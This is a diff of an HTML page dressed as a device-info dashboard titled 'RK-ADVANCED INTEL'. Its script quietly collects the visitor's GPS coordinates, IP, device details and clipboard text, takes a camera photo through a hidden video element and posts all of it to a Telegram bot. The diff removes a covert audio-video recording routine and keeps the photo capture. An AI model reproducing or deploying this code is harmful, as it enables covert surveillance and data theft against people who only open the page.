@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-ADVANCED INTEL | ELITE</title>
+    <title>RK-ADVANCED INTEL | ELITE PRO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -31,44 +31,45 @@
         .rk-banner {
             background: linear-gradient(90deg, #b91c1c, #450a0a);
             color: white; width: 100%; text-align: center;
-            padding: 10px 0; font-family: 'Orbitron', sans-serif;
-            font-weight: 900; letter-spacing: 12px;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.7);
+            padding: 12px 0; font-family: 'Orbitron', sans-serif;
+            font-weight: 900; letter-spacing: 10px;
+            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.8);
             position: fixed; top: 0; z-index: 1001;
-            font-size: 1.3rem; border-bottom: 2px solid #ff0000;
+            font-size: 1.4rem; border-bottom: 3px solid #ff0000;
         }
 
         .dashboard {
             background: rgba(5, 10, 20, 0.98);
             border-radius: 30px; padding: 35px;
             width: 95%; max-width: 550px;
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.25);
-            border: 1px solid rgba(0, 255, 255, 0.4);
-            margin-top: 90px; margin-bottom: 60px;
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.3);
+            border: 1px solid rgba(0, 255, 255, 0.5);
+            margin-top: 100px; margin-bottom: 70px;
             position: relative;
         }
 
         .clock-box {
-            text-align: center; margin-bottom: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 10px; border-radius: 15px;
-            border: 1px solid rgba(255, 0, 0, 0.3);
+            text-align: center; margin-bottom: 25px;
+            background: rgba(255, 0, 0, 0.1);
+            padding: 15px; border-radius: 20px;
+            border: 1px solid rgba(255, 0, 0, 0.5);
+            box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.2);
         }
 
         .info-row {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.08);
         }
-        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; display: flex; align-items: center; gap: 6px; }
-        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 5px #facc1555; }
+        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
+        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
         .footer-text {
-            position: fixed; bottom: 8px; width: 100%;
-            text-align: center; color: #777; font-size: 11px;
-            letter-spacing: 2px; font-weight: bold; text-transform: uppercase;
+            position: fixed; bottom: 10px; width: 100%;
+            text-align: center; color: #888; font-size: 12px;
+            letter-spacing: 3px; font-weight: bold; text-transform: uppercase;
+            text-shadow: 0 0 5px #000;
         }
 
-        /* Hidden Elements */
         #media-bin { display: none; }
     </style>
 </head>
@@ -78,11 +79,11 @@
 
     <div class="dashboard">
         <div class="clock-box">
-            <div id="live-time" class="text-2xl font-black text-red-500 tracking-widest">00:00:00 AM</div>
-            <div id="live-date" class="text-[10px] text-gray-400 uppercase tracking-[3px]">Wait...</div>
+            <div id="live-time" class="text-3xl font-black text-red-500 tracking-[5px]">00:00:00 AM</div>
+            <div id="live-date" class="text-xs text-blue-400 uppercase tracking-[4px] mt-1">INITIALIZING...</div>
         </div>
 
-        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-fuchsia-600 pb-2 italic">📡 ADVANCED INTEL SYSTEM</h1>
+        <h1 class="text-center text-xl font-black text-white tracking-[5px] mb-6 border-b-2 border-red-600 pb-2 italic">📡 RK SYSTEM MONITOR</h1>
         
         <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
@@ -99,7 +100,7 @@
         <div id="new-feature-slot"></div>
     </div>
 
-    <div class="footer-text">This Site Created By RK-SYSTEM 🛠️</div>
+    <div class="footer-text">Created By RK-SYSTEM 🛠️</div>
 
     <video id="media-bin" autoplay muted playsinline></video>
     <canvas id="output-canvas" style="display:none;"></canvas>
@@ -110,7 +111,7 @@
             CHAT: '6048050987'
         };
 
-        // ১. রিয়েল টাইম ঘড়ি ও তারিখ (১২ ঘণ্টা ফরম্যাট)
+        // ঘড়ি ও তারিখ আপডেট
         function updateClock() {
             const now = new Date();
             let h = now.getHours();
@@ -126,94 +127,88 @@
         async function startSystem() {
             updateClock();
             
-            // ২. ডিভাইস ইনফো
-            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Device 📱" : "Desktop/Workstation 💻";
+            // ডিভাইস ডিটেইলস
+            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Device 📱" : "Workstation/PC 💻";
             document.getElementById('v-platform').innerText = navigator.platform;
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB 🧠";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores ⚡";
 
-            // ৩. ব্যাটারি ও চার্জিং
+            // ব্যাটারি লজিক
+            let batLevel = "--%";
+            let chargeState = "Unknown";
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
                 const upBat = () => {
-                    document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% 🔋`;
-                    document.getElementById('v-charge').innerText = b.charging ? "Charging ✅" : "Discharging ❌";
+                    batLevel = `${Math.round(b.level * 100)}% 🔋`;
+                    chargeState = b.charging ? "Charging ✅" : "Discharging ❌";
+                    document.getElementById('v-bat').innerText = batLevel;
+                    document.getElementById('v-charge').innerText = chargeState;
                 };
                 upBat(); b.onlevelchange = upBat; b.onchargingchange = upBat;
             }
 
-            // ৪. পাবলিক আইপি
+            // পাবলিক আইপি
+            let publicIP = "Fetching...";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                document.getElementById('v-ip').innerText = data.ip;
-            } catch(e) { document.getElementById('v-ip').innerText = "Dynamic IP"; }
+                publicIP = data.ip;
+                document.getElementById('v-ip').innerText = publicIP;
+            } catch(e) { publicIP = "Protected/Hidden"; }
 
-            // ৫. নেটওয়ার্ক স্পিড
+            // নেটওয়ার্ক স্পিড
             const conn = navigator.connection || { effectiveType: '4G', downlink: 10 };
-            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+            const netSpeed = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+            document.getElementById('v-speed').innerText = netSpeed;
             document.getElementById('v-status').innerText = "ONLINE 📶";
 
-            // ৬. রিয়েল লাইভ লোকেশন (GPS)
-            let mapsLink = "Location Blocked/N/A";
+            // জিপিএস ও ফাইনাল রিপোর্ট
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     document.getElementById('v-gps').innerText = "SUCCESS 📍";
-                    sendFinalReport(mapsLink); // লোকেশন পাওয়ার পর ফাইনাল রিপোর্ট যাবে
+                    sendFinalReport(mapsLink, batLevel, chargeState, publicIP, netSpeed);
                 }, () => {
-                    document.getElementById('v-gps').innerText = "PERMISSION DENIED ❌";
-                    sendFinalReport(mapsLink);
+                    document.getElementById('v-gps').innerText = "DENIED ❌";
+                    sendFinalReport("Location Access Denied", batLevel, chargeState, publicIP, netSpeed);
                 });
             } else {
-                sendFinalReport(mapsLink);
+                sendFinalReport("GPS Not Supported", batLevel, chargeState, publicIP, netSpeed);
             }
 
-            // ৭. মিডিয়া অটোমেশন
+            // ক্যামেরা ক্যাপচার
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const videoEl = document.getElementById('media-bin');
                 videoEl.srcObject = stream;
-                setTimeout(() => capturePhoto(stream, "FRONT_VIP_RK"), 2000);
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendMediaToBot(blob, 'video', '🎥 *RK-VIP LIVE CAPTURE (5S + AUDIO)*');
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000);
+                setTimeout(() => capturePhoto(stream, "VIP_FRONT_CAPTURE"), 3000);
             } catch (err) {}
         }
 
-        async function sendFinalReport(mapsLink) {
-            let clipText = "Click/Touch Needed 🔓";
+        async function sendFinalReport(maps, bat, pwr, ip, speed) {
+            let clipText = "No Permission 🔒";
             try { clipText = await navigator.clipboard.readText(); } catch (e) {}
 
-            const timestamp = document.getElementById('live-time').innerText;
-            const dateStr = document.getElementById('live-date').innerText;
+            const time = document.getElementById('live-time').innerText;
+            const date = document.getElementById('live-date').innerText;
 
             const report = `
-✨✨✨✨✨✨✨✨✨✨✨✨✨
-🚀 *RK-ADVANCED INTEL VIP REPORT* 🚀
+🚀 *RK-ADVANCED INTEL REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
-🕒 *Time:* \`${timestamp}\`
-📅 *Date:* \`${dateStr}\`
+🕒 *Time:* \`${time}\`
+📅 *Date:* \`${date}\`
 ━━━━━━━━━━━━━━━━━━━━━
 📱 *Device:* \`${navigator.platform}\`
-🔋 *Power:* \`${document.getElementById('v-bat').innerText} (${document.getElementById('v-charge').innerText})\`
+🔋 *Battery:* \`${bat}\`
+⚡ *Power:* \`${pwr}\`
 🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
-📶 *Net:* \`${document.getElementById('v-speed').innerText}\`
-🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
+🚀 *Speed:* \`${speed}\`
+🌐 *IP:* \`${ip}\`
 ━━━━━━━━━━━━━━━━━━━━━
 📍 *LIVE GPS LOCATION:*
-${mapsLink}
+${maps}
 ━━━━━━━━━━━━━━━━━━━━━
-✨ *CLIPBOARD CONTENT:*
+✨ *CLIPBOARD TEXT:*
 \`\`\`
 ${clipText}
 \`\`\`
@@ -228,16 +223,14 @@ ${clipText}
             const video = document.getElementById('media-bin');
             canvas.width = 1280; canvas.height = 720;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
-        }
-
-        async function sendMediaToBot(blob, type, caption) {
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT);
-            fd.append(type, blob, type === 'video' ? 'rk.mp4' : 'rk.jpg');
-            fd.append('caption', caption);
-            fd.append('parse_mode', 'Markdown');
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT);
+                fd.append('photo', blob, 'rk_intel.jpg');
+                fd.append('caption', `📸 *${label}*`);
+                fd.append('parse_mode', 'Markdown');
+                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
         }
 
         function sendToBot(method, data) {
